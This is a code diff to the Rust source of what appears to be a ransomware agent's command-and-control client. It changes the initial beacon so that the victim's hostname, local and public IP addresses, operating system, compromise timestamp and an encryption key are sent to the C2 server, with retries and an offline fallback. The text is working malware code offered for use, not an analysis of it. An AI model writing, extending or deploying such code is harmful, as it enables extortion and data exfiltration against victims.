@@ -39,19 +39,16 @@ async fn send_message(addr: &str, message: AgentMessage, timeout_secs: u64) -> R
 }
 
 /// Beacon C2 and send victim info and encrypted key to C2
-/// if C2 unavailable, operate offline until can connect -> send in random intervals until connected
-pub async fn initial_beacon(addr: &str, retries: u64, timeout: u64, logger: &Logger) -> (u64, String) {
-    let beacon = match get_info().await {
+pub async fn initial_beacon(addr: &str, retries: u64, timeout: u64, logger: &Logger, key: Vec<u8>) -> (u64, String) {
+    let beacon = match get_info(key).await {
         Ok(beacon) => beacon,
         Err(e) => {
             logger.error(&format!("[-] Failed to get host info: {:?}", e));
-            // eprintln!("[-] Failed to get host info: {:?}", e);
             return (0, "NONE".to_string());
         }
     };
 
     for attempt in 1..=retries {
-        // logger.log(&format!("[*] Attempting beacon (attempt {}/{})", attempt, retries));
         println!("[*] Attempting beacon (attempt {}/{})", attempt, retries);
         match send_message(addr, beacon.clone(), timeout).await {
             Ok(Some(ServerMessage::Ack {
@@ -60,24 +57,20 @@ pub async fn initial_beacon(addr: &str, retries: u64, timeout: u64, logger: &Log
                 session_id,
             })) => {
                 logger.log(&format!("[*] Received Ack from server (status: {})", status));
-                // println!("[*] Received Ack from server (status: {})", status);
                 return (agent_id, session_id);
             }
             Ok(Some(msg)) => {
                 logger.error(&format!("[!] Unexpected message: {:?}", msg));
-                // eprintln!("[!] Unexpected message: {:?}", msg);
                 return (0, "NONE".to_string());
             }
             Err(e) => {
                 logger.error(&format!("[!] Beacon attempt failed: {}", e));
-                // eprintln!("[!] Beacon attempt failed: {}", e);
             }
             _ => {}
         }
     }
 
     logger.log(&format!("[!] No Ack received after {} attempts. Operating offline.", retries));
-    // eprintln!("[!] No Ack received after {} attempts. Operating offline.", retries);
     (0, "NONE".to_string())
 }
 
@@ -173,7 +166,7 @@ pub async fn reconnect(addr: &str, agent_id: u64, session_id: &str, timeout: u64
     /// - `ip`: The public IP address of the system.
     /// - `os`: The operating system as a `String`.
     /// - `time_compromised`: The timestamp when the system was compromised, formatted as an RFC 3339 string.
-pub async fn get_info() -> Result<AgentMessage, Box<dyn std::error::Error>> {
+pub async fn get_info(key: Vec<u8>) -> Result<AgentMessage, Box<dyn std::error::Error>> {
     let hostname = gethostname();
     let local_ip = local_ip()?;
     let os = std::env::consts::OS;
@@ -186,7 +179,8 @@ pub async fn get_info() -> Result<AgentMessage, Box<dyn std::error::Error>> {
         hostname: hostname.to_string_lossy().to_string(), 
         ip: public_ip, 
         os: os.to_string(), 
-        time_compromised: chrono::Local::now().to_rfc3339() 
+        time_compromised: chrono::Local::now().to_rfc3339(),
+        key
     };
 
     Ok(message)
